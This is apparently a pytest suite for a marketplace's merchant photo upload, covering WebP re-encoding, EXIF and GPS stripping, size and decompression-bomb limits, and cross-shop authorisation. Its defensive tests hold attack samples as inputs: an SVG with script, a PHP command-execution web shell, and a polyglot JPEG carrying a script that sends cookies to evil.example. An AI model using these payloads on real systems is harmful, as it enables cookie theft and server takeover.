"""
Merchant photo upload: what gets stored, what gets refused, and who can see it.

Photos are the first thing this platform accepts from a stranger that it then
serves back to everyone else. That makes the negative tests the important
ones -- a file that is not what it claims, a file that is a bomb, a file
belonging to another shop -- and it makes ONE positive test load-bearing: that
what comes back out is a re-encoded image and not the bytes that went in.
"""

import io
from fractions import Fraction

import pytest
from PIL import Image

from app.models.listing_photo import ListingPhoto
from app.models.store import Store
from app.services.images import (
    MAX_UPLOAD_BYTES,
    ImageRejected,
    process_upload,
)

PASSWORD = "TestPass123"


# --- Fixtures ---------------------------------------------------------------


def photo_bytes(size=(800, 600), fmt="JPEG", color=(200, 30, 30), **save):
    """A real image file, encoded the way a camera or a browser would."""
    buffer = io.BytesIO()
    Image.new("RGB", size, color).save(buffer, format=fmt, **save)
    return buffer.getvalue()


def signup(client, email):
    response = client.post(
        "/auth/register", json={"email": email, "password": PASSWORD}
    )
    assert response.status_code == 201, response.text
    return {"Authorization": f"Bearer {response.json()['access_token']}"}


def open_shop(client, email, name):
    headers = signup(client, email)
    response = client.post(
        "/merchant/store",
        json={"name": name, "phone": "0791234567"},
        headers=headers,
    )
    assert response.status_code == 201, response.text
    return headers, response.json()


def add_listing(client, headers, name="Apple iPhone 15 128GB Black", price=790.0):
    response = client.post(
        "/merchant/listings",
        json={"name": name, "price": price},
        headers=headers,
    )
    assert response.status_code == 201, response.text
    return response.json()


def verify(db_session, store_id):
    store = db_session.query(Store).filter(Store.id == store_id).first()
    store.is_verified = True
    db_session.commit()


def upload(client, headers, listing_id, data, filename="photo.jpg", ctype="image/jpeg"):
    return client.put(
        f"/merchant/listings/{listing_id}/photo",
        files={"file": (filename, data, ctype)},
        headers=headers,
    )


# --- The processing pipeline ------------------------------------------------


class TestProcessing:
    """
    These run against the pure function, with no server. The re-encode is the
    single control the whole feature rests on, so it is tested where it can be
    tested exhaustively.
    """

    def test_output_is_always_webp_whatever_went_in(self):
        for fmt in ("JPEG", "PNG", "WEBP"):
            processed = process_upload(photo_bytes(fmt=fmt))
            assert processed.content_type == "image/webp"
            assert Image.open(io.BytesIO(processed.data)).format == "WEBP"

    def test_a_large_photo_is_scaled_down(self):
        processed = process_upload(photo_bytes(size=(4000, 3000)))
        assert max(processed.width, processed.height) == 1400
        # Aspect ratio kept -- a squashed product photo looks broken.
        assert processed.width / processed.height == pytest.approx(4 / 3, abs=0.01)

    def test_a_small_photo_is_not_enlarged(self):
        """Upscaling invents detail and looks worse than the original."""
        processed = process_upload(photo_bytes(size=(320, 240)))
        assert (processed.width, processed.height) == (320, 240)

    def test_exif_does_not_survive(self):
        """
        Shop photos are taken on phones, and phone photos carry GPS. This is
        the assertion that keeps this platform's "no personal data" claim
        true for a field nobody looks at.
        """
        buffer = io.BytesIO()
        image = Image.new("RGB", (600, 400), (10, 10, 10))
        exif = image.getexif()
        exif[0x010F] = "SuspiciousPhone"  # Make
        # A real GPS block -- Amman, roughly. Rationals rather than plain
        # tuples, which is what the EXIF spec stores and what Pillow will
        # agree to write.
        exif[0x8825] = {
            1: "N", 2: (Fraction(31), Fraction(57), Fraction(0)),
            3: "E", 4: (Fraction(35), Fraction(56), Fraction(0)),
        }
        image.save(buffer, format="JPEG", exif=exif.tobytes())

        original = buffer.getvalue()
        assert b"SuspiciousPhone" in original, "fixture did not embed EXIF"
        assert Image.open(io.BytesIO(original)).getexif().get_ifd(0x8825), (
            "fixture did not embed GPS"
        )

        processed = process_upload(original)
        assert b"SuspiciousPhone" not in processed.data
        survivors = Image.open(io.BytesIO(processed.data)).getexif()
        assert not survivors
        assert not survivors.get_ifd(0x8825)

    def test_orientation_is_applied_before_exif_is_dropped(self):
        """
        A phone records a sideways sensor and sets a rotation FLAG rather than
        rotating pixels. Strip the flag without acting on it and every photo
        taken in portrait arrives on its side -- which looks like a bug in the
        site, not in the camera.
        """
        buffer = io.BytesIO()
        image = Image.new("RGB", (800, 400), (0, 0, 255))
        exif = image.getexif()
        exif[0x0112] = 6  # Orientation: rotate 90 CW
        image.save(buffer, format="JPEG", exif=exif.tobytes())

        processed = process_upload(buffer.getvalue())
        # Landscape in, portrait out: the rotation was honoured.
        assert processed.height > processed.width

    def test_svg_is_refused_by_name(self):
        """
        SVG can carry <script> and executes on the origin that serves it.
        Pillow would fail to decode it anyway; the explicit check exists so
        the merchant is told why rather than "not an image".
        """
        svg = b'<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'
        with pytest.raises(ImageRejected) as caught:
            process_upload(svg)
        assert caught.value.code == "svg"

    def test_a_bare_svg_tag_is_refused_too(self):
        with pytest.raises(ImageRejected) as caught:
            process_upload(b"<svg xmlns='http://www.w3.org/2000/svg'></svg>")
        assert caught.value.code == "svg"

    def test_a_script_disguised_as_a_jpeg_is_refused(self):
        with pytest.raises(ImageRejected) as caught:
            process_upload(b"<?php system($_GET['c']); ?>" + b"\xff\xd8\xff")
        assert caught.value.code == "not_an_image"

    def test_a_payload_appended_to_a_real_image_does_not_survive(self):
        """
        THE POLYGLOT CASE, and the reason re-encoding is the control rather
        than validation. This file IS a valid JPEG -- it decodes, it has the
        right magic bytes, any check on the header passes it -- and it also
        carries a script after the image data. Re-encoding writes a new file
        from pixels, so the passenger is simply not copied across.
        """
        payload = b"<script>fetch('https://evil.example/'+document.cookie)</script>"
        polyglot = photo_bytes() + payload
        assert Image.open(io.BytesIO(polyglot)).format == "JPEG"

        processed = process_upload(polyglot)
        assert payload not in processed.data

    def test_an_empty_file_is_refused(self):
        with pytest.raises(ImageRejected) as caught:
            process_upload(b"")
        assert caught.value.code == "empty"

    def test_an_oversized_file_is_refused_before_decoding(self):
        with pytest.raises(ImageRejected) as caught:
            process_upload(b"\xff" * (MAX_UPLOAD_BYTES + 1))
        assert caught.value.code == "too_large"

    def test_a_decompression_bomb_is_refused(self):
        """
        A small file that decodes to an enormous one. No exploit needed, just
        a very compressible PNG -- this one is a couple of hundred KB on disk
        and would be gigabytes of pixels in memory.
        """
        buffer = io.BytesIO()
        Image.new("L", (12000, 12000), 0).save(buffer, format="PNG")
        assert len(buffer.getvalue()) < MAX_UPLOAD_BYTES, "fixture is not a bomb"

        with pytest.raises(ImageRejected) as caught:
            process_upload(buffer.getvalue())
        assert caught.value.code == "too_many_pixels"

    def test_transparency_is_flattened_onto_white(self):
        """A transparent PNG renders black on a dark-mode card otherwise."""
        buffer = io.BytesIO()
        Image.new("RGBA", (200, 200), (255, 0, 0, 0)).save(buffer, format="PNG")
        processed = process_upload(buffer.getvalue())
        assert Image.open(io.BytesIO(processed.data)).mode in ("RGB", "RGBX")


# --- Upload, replace, remove ------------------------------------------------


class TestUpload:
    def test_a_merchant_can_attach_a_photo(self, client, db_session):
        headers, _ = open_shop(client, "shop@example.com", "Photo Shop")
        listing = add_listing(client, headers)

        assert upload(client, headers, listing["id"], photo_bytes()).status_code == 204

        stored = db_session.query(ListingPhoto).one()
        assert stored.alias_id == listing["id"]
        assert stored.content_type == "image/webp"
        assert stored.byte_size == len(stored.data)
        assert len(stored.checksum) == 64

    def test_the_listing_reports_that_it_has_one(self, client):
        headers, _ = open_shop(client, "shop@example.com", "Photo Shop")
        listing = add_listing(client, headers)
        assert listing["has_photo"] is False

        upload(client, headers, listing["id"], photo_bytes())

        listings = client.get("/merchant/listings", headers=headers).json()
        assert listings[0]["has_photo"] is True

    def test_uploading_again_replaces_rather_than_accumulates(self, client, db_session):
        """A shop owner re-uploading has corrected a bad shot, not added one."""
        headers, _ = open_shop(client, "shop@example.com", "Photo Shop")
        listing = add_listing(client, headers)

        upload(client, headers, listing["id"], photo_bytes(color=(255, 0, 0)))
        first = db_session.query(ListingPhoto).one().checksum

        upload(client, headers, listing["id"], photo_bytes(color=(0, 0, 255)))
        db_session.expire_all()

        assert db_session.query(ListingPhoto).count() == 1
        assert db_session.query(ListingPhoto).one().checksum != first

    def test_a_photo_can_be_removed(self, client, db_session):
        headers, _ = open_shop(client, "shop@example.com", "Photo Shop")
        listing = add_listing(client, headers)
        upload(client, headers, listing["id"], photo_bytes())

        response = client.delete(
            f"/merchant/listings/{listing['id']}/photo", headers=headers
        )
        assert response.status_code == 204
        assert db_session.query(ListingPhoto).count() == 0

    def test_deleting_the_listing_takes_the_photo_with_it(self, client, db_session):
        headers, _ = open_shop(client, "shop@example.com", "Photo Shop")
        listing = add_listing(client, headers)
        upload(client, headers, listing["id"], photo_bytes())

        client.delete(f"/merchant/listings/{listing['id']}", headers=headers)
        assert db_session.query(ListingPhoto).count() == 0

    def test_a_refusal_names_the_reason_in_a_code(self, client):
        """
        The client turns the code into a sentence in the shop owner's
        language. A prose message from the server would be English-only, which
        is the bug this project just finished removing elsewhere.
        """
        headers, _ = open_shop(client, "shop@example.com", "Photo Shop")
        listing = add_listing(client, headers)

        response = upload(
            client, headers, listing["id"], b"<svg xmlns='x'></svg>", "x.svg", "image/svg+xml"
        )
        assert response.status_code == 422
        assert response.json()["detail"]["code"] == "svg"

    def test_a_lying_content_type_does_not_help(self, client):
        """What the file IS is decided by decoding it, never by what it says."""
        headers, _ = open_shop(client, "shop@example.com", "Photo Shop")
        listing = add_listing(client, headers)

        response = upload(
            client, headers, listing["id"], b"not an image at all", "photo.jpg", "image/jpeg"
        )
        assert response.status_code == 422
        assert response.json()["detail"]["code"] == "not_an_image"

    def test_an_oversized_upload_is_rejected(self, client):
        headers, _ = open_shop(client, "shop@example.com", "Photo Shop")
        listing = add_listing(client, headers)

        response = upload(client, headers, listing["id"], b"\x00" * (MAX_UPLOAD_BYTES + 10))
        assert response.status_code == 413
        assert response.json()["detail"]["code"] == "too_large"


# --- Authorisation ----------------------------------------------------------


class TestAuthorisation:
    def test_a_shop_cannot_put_a_photo_on_another_shops_listing(
        self, client, db_session
    ):
        """
        The same boundary the price routes have, and the reason it is worth a
        test of its own: a photo on a rival's listing is a defacement, and the
        listing id is the only thing the attacker needs to guess.
        """
        owner, _ = open_shop(client, "owner@example.com", "Owner Shop")
        listing = add_listing(client, owner)

        intruder, _ = open_shop(client, "intruder@example.com", "Intruder Shop")
        response = upload(client, intruder, listing["id"], photo_bytes())

        # 404, not 403: a merchant has no business learning that someone
        # else's listing id exists.
        assert response.status_code == 404
        assert db_session.query(ListingPhoto).count() == 0

    def test_a_shop_cannot_delete_another_shops_photo(self, client, db_session):
        owner, _ = open_shop(client, "owner@example.com", "Owner Shop")
        listing = add_listing(client, owner)
        upload(client, owner, listing["id"], photo_bytes())

        intruder, _ = open_shop(client, "intruder@example.com", "Intruder Shop")
        response = client.delete(
            f"/merchant/listings/{listing['id']}/photo", headers=intruder
        )
        assert response.status_code == 404
        assert db_session.query(ListingPhoto).count() == 1

    def test_a_shop_cannot_read_another_shops_photo(self, client):
        owner, _ = open_shop(client, "owner@example.com", "Owner Shop")
        listing = add_listing(client, owner)
        upload(client, owner, listing["id"], photo_bytes())

        intruder, _ = open_shop(client, "intruder@example.com", "Intruder Shop")
        response = client.get(
            f"/merchant/listings/{listing['id']}/photo", headers=intruder
        )
        assert response.status_code == 404

    def test_uploading_needs_an_account(self, client):
        owner, _ = open_shop(client, "owner@example.com", "Owner Shop")
        listing = add_listing(client, owner)

        response = client.put(
            f"/merchant/listings/{listing['id']}/photo",
            files={"file": ("p.jpg", photo_bytes(), "image/jpeg")},
        )
        assert response.status_code == 401


# --- What shoppers see ------------------------------------------------------


class TestPublicVisibility:
    def test_a_verified_shops_photo_is_served(self, client, db_session):
        headers, store = open_shop(client, "shop@example.com", "Photo Shop")
        listing = add_listing(client, headers)
        upload(client, headers, listing["id"], photo_bytes())
        verify(db_session, store["id"])

        product_id = client.get("/merchant/listings", headers=headers).json()[0][
            "matched_product_id"
        ]
        response = client.get(f"/products/{product_id}/photo")

        assert response.status_code == 200
        assert response.headers["content-type"] == "image/webp"
        assert Image.open(io.BytesIO(response.content)).format == "WEBP"

    def test_an_unverified_shops_photo_is_not(self, client, db_session):
        """
        The same rule the prices follow. Until an admin has checked the claim
        there is nothing connecting the shop name to the shop, and a picture
        on a product page is a stronger endorsement than a price.
        """
        headers, _ = open_shop(client, "shop@example.com", "Photo Shop")
        listing = add_listing(client, headers)
        upload(client, headers, listing["id"], photo_bytes())

        product_id = client.get("/merchant/listings", headers=headers).json()[0][
            "matched_product_id"
        ]
        assert client.get(f"/products/{product_id}/photo").status_code == 404

    def test_the_shop_can_still_see_its_own_while_pending(self, client):
        """Otherwise a pending shop cannot tell a failed upload from a wait."""
        headers, _ = open_shop(client, "shop@example.com", "Photo Shop")
        listing = add_listing(client, headers)
        upload(client, headers, listing["id"], photo_bytes())

        response = client.get(
            f"/merchant/listings/{listing['id']}/photo", headers=headers
        )
        assert response.status_code == 200

    def test_a_product_with_no_photo_says_so(self, client):
        headers, _ = open_shop(client, "shop@example.com", "Photo Shop")
        add_listing(client, headers)
        product_id = client.get("/merchant/listings", headers=headers).json()[0][
            "matched_product_id"
        ]
        assert client.get(f"/products/{product_id}/photo").status_code == 404

    def test_the_product_page_points_at_the_photo(self, client, db_session):
        headers, store = open_shop(client, "shop@example.com", "Photo Shop")
        listing = add_listing(client, headers)
        upload(client, headers, listing["id"], photo_bytes())
        verify(db_session, store["id"])

        product_id = client.get("/merchant/listings", headers=headers).json()[0][
            "matched_product_id"
        ]
        detail = client.get(f"/products/{product_id}").json()
        assert detail["image_url"] == f"/products/{product_id}/photo"

    def test_a_scraped_image_still_wins(self, client, db_session):
        """
        A retailer's press shot describes the MODEL, which is what a browsing
        shopper wants. Letting one merchant's photo override it would also let
        one shop change the picture on a product four others sell.
        """
        from app.models.product import Product

        headers, store = open_shop(client, "shop@example.com", "Photo Shop")
        listing = add_listing(client, headers)
        upload(client, headers, listing["id"], photo_bytes())
        verify(db_session, store["id"])

        product_id = client.get("/merchant/listings", headers=headers).json()[0][
            "matched_product_id"
        ]
        product = db_session.query(Product).filter(Product.id == product_id).first()
        product.image_url = "https://cdn.example/press-shot.jpg"
        db_session.commit()

        detail = client.get(f"/products/{product_id}").json()
        assert detail["image_url"] == "https://cdn.example/press-shot.jpg"

    def test_a_repeat_view_revalidates_instead_of_resending(self, client, db_session):
        """
        These bytes come out of the database, so a grid that does not
        revalidate is a blob read per thumbnail per scroll.
        """
        headers, store = open_shop(client, "shop@example.com", "Photo Shop")
        listing = add_listing(client, headers)
        upload(client, headers, listing["id"], photo_bytes())
        verify(db_session, store["id"])

        product_id = client.get("/merchant/listings", headers=headers).json()[0][
            "matched_product_id"
        ]
        first = client.get(f"/products/{product_id}/photo")
        etag = first.headers["etag"]

        second = client.get(
            f"/products/{product_id}/photo", headers={"If-None-Match": etag}
        )
        assert second.status_code == 304
        assert second.content == b""

    def test_the_bytes_are_never_sniffable(self, client, db_session):
        headers, store = open_shop(client, "shop@example.com", "Photo Shop")
        listing = add_listing(client, headers)
        upload(client, headers, listing["id"], photo_bytes())
        verify(db_session, store["id"])

        product_id = client.get("/merchant/listings", headers=headers).json()[0][
            "matched_product_id"
        ]
        response = client.get(f"/products/{product_id}/photo")
        assert response.headers["x-content-type-options"] == "nosniff"
